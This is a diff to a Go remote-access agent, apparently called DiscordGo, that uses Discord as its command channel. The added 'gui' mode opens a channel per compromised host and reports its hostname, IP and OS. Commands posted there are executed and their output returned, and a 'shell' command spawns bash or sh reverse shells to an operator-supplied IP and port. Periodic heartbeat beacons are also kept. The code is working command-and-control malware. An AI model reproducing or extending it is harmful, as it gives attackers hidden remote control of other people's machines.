@@ -2,16 +2,17 @@ package main
 
 import (
 	"encoding/json"
+	"flag"
 	"fmt"
 	"net"
 	"os"
 	"os/exec"
 	"os/signal"
 	"runtime"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
-	"strconv"
 
 	"DiscordGo/pkg/agent"
 	"DiscordGo/pkg/message"
@@ -22,9 +23,29 @@ import (
 )
 
 var newAgent *agent.Agent
+var mode string
+var channelID *discordgo.Channel
+
+// TODO: Create a flag --mode
+// --mode cli and --mode gui(discord)
+// Not the server, we would say, if you pick cli, run the server
+// first
 
 // Create an Agent
 func init() {
+	const (
+		typemode = "CLI interface if you don't have discord installed or Uses discord desktop or web app to talk to agents"
+	)
+
+	flag.StringVar(&mode, "mode", "", typemode)
+	flag.Parse()
+
+	if mode == "" {
+		println("You need to use the mode flag")
+		flag.PrintDefaults()
+		os.Exit(1)
+	}
+
 	newAgent = &agent.Agent{}
 	newAgent.UUID = util.GenerateUUID()
 	newAgent.HostName, _ = os.Hostname()
@@ -58,19 +79,26 @@ func main() {
 		fmt.Println()
 	}
 
-	firstMessage := newAgent.HostName + ":" + newAgent.IP + ":" + newAgent.OS
-	sendMessage := message.NewMessage(newAgent.UUID, firstMessage, false, false, message.MESSAGE_NEW)
-	dg.ChannelMessageSend(constants.ChannelID, sendMessage)
+	// var channelID *discordgo.Channel;
+	if mode == "gui" {
+		channelID, _ = dg.GuildChannelCreate(constants.ServerID, newAgent.IP, 0)
+		// if err != nil{
+		// 	panic(err)
+		// }
+		dg.ChannelEditComplex(channelID.ID, &discordgo.ChannelEdit{ParentID: "892514882174472212"})
 
-	// Register the messageCreate func as a callback for MessageCreate events.
-	dg.AddHandler(messageCreator)
-	// dg.AddHandler(heartBeat)
-	go heartBeat(dg)
+		sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
+		message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
+		dg.ChannelMessagePin(channelID.ID, message.ID)
+		dg.AddHandler(guimessageCreater)
+	} else {
+		firstMessage := newAgent.HostName + ":" + newAgent.IP + ":" + newAgent.OS
+		sendMessage := message.NewMessage(newAgent.UUID, firstMessage, false, false, message.MESSAGE_NEW)
+		dg.ChannelMessageSend(constants.ChannelID, sendMessage)
 
-	// ping the server every minute
-	// pulseDelay := time.Duration(10)
-	// tick := time.NewTicker(time.Second * pulseDelay)
-	// go heartbeat(dg, tick)
+		// Register the messageCreate func as a callback for MessageCreate events.
+		dg.AddHandler(messageCreator)
+	}
 
 	// Open a websocket connection to Discord and begin listening.
 	err = dg.Open()
@@ -91,10 +119,14 @@ func main() {
 	sendLMessage := message.NewMessage(newAgent.UUID, lastMessage, false, false, message.MESSAGE_DISCONNECT)
 	dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
 
+	// Delete a channel
+	dg.ChannelDelete(channelID.ID)
+
 	// Cleanly close down the Discord session.
 	dg.Close()
 
 }
+
 
 func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
 
@@ -142,14 +174,14 @@ func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
 			} else {
 				reverseShell(messageJSON.Message)
 			}
-		} 
+		}
 		// else if messageJSON.MessageType == message.MESSAGE_PONG {
 		// 	println("message:" + messageJSON.Message)
 		// }
 	}
 }
 
-func heartBeat(dg *discordgo.Session){
+func heartBeat(dg *discordgo.Session) {
 	// fmt.Println("1 minute")
 	// sendLMessage := message.NewMessage(newAgent.UUID, "", false, false, message.MESSAGE_HEARTBEAT)
 	// dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
@@ -159,8 +191,8 @@ func heartBeat(dg *discordgo.Session){
 	tick := time.NewTicker(time.Second * pulseDelay)
 	// go heartbeat(dg, tick)
 	for t := range tick.C {
-		fmt.Printf("%v:%v\n", t.Minute(), t.Second())
-		sendLMessage := message.NewMessage(newAgent.UUID, strconv.Itoa(t.Minute()) + ":" + strconv.Itoa(t.Second()), false, false, message.MESSAGE_HEARTBEAT)
+		// fmt.Printf("%v:%v\n", t.Minute(), t.Second())
+		sendLMessage := message.NewMessage(newAgent.UUID, strconv.Itoa(t.Minute())+":"+strconv.Itoa(t.Second()), false, false, message.MESSAGE_HEARTBEAT)
 		dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
 	}
 }
@@ -229,7 +261,7 @@ func reverseShell(host string) {
 	fmt.Println("Host: " + host)
 	conn, err := net.Dial("tcp", host)
 	if err != nil {
-		fmt.Println("Could not connect to server")
+		// fmt.Println("Could not connect to server")
 		conn.Close()
 		return
 	}
@@ -249,6 +281,77 @@ func heartbeat(dg *discordgo.Session, tick *time.Ticker) {
 // Attempt to ping the server to let them know we are still alive and kicking. This will (in theory) remain persistent even if the server resets etc
 func pingTheServer(dg *discordgo.Session, tick time.Time) {
 	fmt.Println("1 minute")
-	newMessage := message.NewMessage(newAgent.UUID, "Ping at " + tick.String(), false, false, message.MESSAGE_PING)
+	newMessage := message.NewMessage(newAgent.UUID, "Ping at "+tick.String(), false, false, message.MESSAGE_PING)
 	dg.ChannelMessageSend(constants.ChannelID, newMessage)
+}
+
+func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
+	if !message.Author.Bot {
+		if message.ChannelID == channelID.ID {
+			if message.Content == "ping" {
+				dg.ChannelMessageSend(message.ChannelID, "I'm alive bruv")
+			} else if message.Content == "kill" {
+				dg.ChannelDelete(channelID.ID)
+				os.Exit(0)
+			} else if strings.Contains(message.Content, "cd"){ // TODO: 
+				commandBreakdown := strings.Fields(message.Content)
+				os.Chdir(commandBreakdown[1])
+				dg.ChannelMessageSend(message.ChannelID,  "```Directory changed to " + commandBreakdown[1] + "```")
+			} else if strings.Contains(message.Content, "shell"){
+				splitCommand := strings.Fields(message.Content)
+				if len(splitCommand) == 1 {
+					dg.ChannelMessageSend(message.ChannelID,  "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell python 127.0.0.1 69696\n Shell type: bash, sh, python and nc```")
+				} else if len(splitCommand) == 4 {
+					shelltype := splitCommand[1]
+					if shelltype == "bash" {
+						hhh := splitCommand[2] + ":" + splitCommand[3]
+						conn, _ := net.Dial("tcp", hhh)
+						if conn == nil {
+							// println("please don't crash")
+							return
+						}
+
+						sh := exec.Command("/bin/bash")
+						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
+						sh.Run()
+						// dg.ChannelMessageSend(message.ChannelID,  "```You should receive a shell at port ####```")
+						conn.Close()
+					} else if shelltype == "python" {
+
+					} else if shelltype == "sh" {
+						hhh := splitCommand[2] + ":" + splitCommand[3]
+						conn, _ := net.Dial("tcp", hhh)
+						if conn == nil {
+							println("please don't crash")
+							return
+						}
+
+						sh := exec.Command("/bin/sh")
+						sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
+						sh.Run()
+						// dg.ChannelMessageSend(message.ChannelID,  "```You should receive a shell at port ####```")
+						conn.Close()
+					} else if shelltype == "nc" {
+
+					} else {
+						dg.ChannelMessageSend(message.ChannelID,  "```Not a supported shell type```")
+					}
+				} else {
+					dg.ChannelMessageSend(message.ChannelID,  "``` Incomplete command ```")
+				}
+			} else {
+				output := executeCommand(message.Content)
+				if output == "" {
+					dg.ChannelMessageSend(message.ChannelID, "Command didn't return anything")
+				} else if len(output) > 2000 {
+					firsthalf := output[:1900]
+					otherhalf := output[1900:]
+					dg.ChannelMessageSend(message.ChannelID,  "```" + firsthalf + "```")
+					dg.ChannelMessageSend(message.ChannelID,  "```" + otherhalf + "```")
+				} else {
+					dg.ChannelMessageSend(message.ChannelID,  "```" + output + "```")
+				}
+			}
+		}
+	}
 }
